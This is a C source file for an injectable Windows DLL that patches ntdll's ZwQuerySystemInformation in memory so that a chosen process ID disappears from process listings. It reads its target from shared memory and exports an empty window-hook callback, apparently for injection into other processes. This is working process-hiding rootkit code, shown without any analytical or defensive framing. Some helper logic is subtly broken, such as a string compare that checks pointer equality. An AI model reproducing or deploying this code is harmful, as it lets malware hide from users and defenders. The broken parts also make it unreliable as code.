#include"dll.h"
MHF mhaddr;
HMODULE dllm;
FARPROC addr;
NTSTATUS status;
char s[256],*fileName,path[256];
unsigned long oldProtect;
unsigned long long hidepid;
tZQSI ZwQuerySystemInformation;
PSYSTEM_PROCESS_INFORMATION prep,curp;
unsigned char x[14]={0xFF,0x25},o[14];
DLLIMPORT LRESULT CALLBACK WindowHookCallback(int nCode,WPARAM wParam,LPARAM lParam){
	return CallNextHookEx(0,nCode,wParam,lParam);
}
NTSTATUS myhook(SYSTEM_INFORMATION_CLASS SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength){
	memcpy((void*)addr,o,sizeof(x));
    status=ZwQuerySystemInformation(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);
	if(SystemInformationClass==SystemProcessInformation&&NT_SUCCESS(status)){
	    prep=0;
		curp=(PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		while(1){
            if(hidepid==(unsigned long long)curp->UniqueProcessId){
                if(curp->NextEntryOffset==0){
                    prep->NextEntryOffset=0;
                }else{
                    prep->NextEntryOffset=curp->NextEntryOffset+prep->NextEntryOffset;
                }
            }
            else{
                prep=curp;
            }
            if(curp->NextEntryOffset==0){
                break;
            }
			curp=(PSYSTEM_PROCESS_INFORMATION)((char*)curp+curp->NextEntryOffset);
        }
	}
	memcpy((void*)addr,x,sizeof(x));
	return status;
}
int strcmpignA(const char*a,const char*b){
	int c=strlen(a),d=strlen(b);
	if(a!=b)return 0;
	int i=0;
	for(i=0;i<c;i++){
        if(tolower(a[i])!=tolower(b[i])){
            return 0;
        }
    }
    return 1;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){
	switch(fdwReason){
		case DLL_PROCESS_ATTACH:{
    		HANDLE hMapFile=OpenFileMapping(FILE_MAP_READ,FALSE,"hidepid");
    		unsigned long long*sharedData=(unsigned long long*)MapViewOfFile(hMapFile,FILE_MAP_READ,0,0,sizeof(unsigned long long));
			hidepid=*sharedData;
			UnmapViewOfFile(sharedData);
    		CloseHandle(hMapFile);
			HANDLE hMapFile2=OpenFileMapping(FILE_MAP_READ,FALSE,"taskp");
    		char*sharedData2=(char*)MapViewOfFile(hMapFile2,FILE_MAP_READ,0,0,256);
			strcpy(s,sharedData2);
			UnmapViewOfFile(sharedData2);
    		CloseHandle(hMapFile2);
    		if(strcmp(s,"ILLTY"))goto a;
    		GetModuleFileNameA(0,path,256);
    		fileName=strrchr(path,'\\')+1;
    		if(strcmpignA(fileName,s))break;
a:
			mhaddr=myhook;
			dllm=LoadLibraryA("ntdll.dll");
			addr=GetProcAddress(dllm,"ZwQuerySystemInformation");
			ZwQuerySystemInformation=(tZQSI)addr;
    		memcpy(o,(void*)addr,sizeof(x));
			memcpy(x+6,&mhaddr,sizeof(mhaddr));
		    VirtualProtect((void*)addr,sizeof(x),PAGE_EXECUTE_READWRITE,&oldProtect);
			memcpy((void*)addr,x,sizeof(x));
			break;
		}
		case DLL_PROCESS_DETACH:{
			if(strcmp(s,"ILLTY"));
			else if(strcmpignA(fileName,s))break;
    		memcpy((void*)addr,o,sizeof(x));
    		VirtualProtect((void*)addr,sizeof(x),oldProtect,&oldProtect);
			break;
		}
		case DLL_THREAD_ATTACH:{
			break;
		}
		case DLL_THREAD_DETACH:{
			break;
		}
	}
	return TRUE;
}
